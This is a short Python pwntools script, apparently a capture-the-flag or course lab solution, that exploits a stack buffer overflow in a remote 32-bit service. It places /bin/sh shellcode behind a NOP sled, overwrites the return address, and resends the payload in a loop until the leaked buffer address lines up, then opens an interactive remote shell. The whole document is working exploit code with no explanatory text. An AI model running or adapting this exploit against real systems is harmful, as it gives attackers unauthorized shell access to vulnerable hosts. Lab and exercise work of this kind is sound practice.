from pwn import *

context.clear(arch='i386')

nop_sled = 16300
ret_offset = 16392
ret_addr = 0xffbfffff

exploit_str = flat({nop_sled:asm(shellcraft.i386.sh()), ret_offset:pack(ret_addr)}, filler='\x90')

index = 1
while True:
    print 'index: ' + str(index)
    #p = process('./brute')
    p = remote('cs4401shell2.walls.ninja', 60964)
    p.sendline(exploit_str)
    
    buffer_addr = int(p.recvline(), 0)
    #print 'buffer_addr: ' + hex(buffer_addr)
    #print 'buffer_addr + nop_sled: ' + hex(buffer_addr + nop_sled)
    index += 1
    
    if ret_addr > buffer_addr and ret_addr < buffer_addr + nop_sled:
        p.interactive()
    #else:
        #p.close()
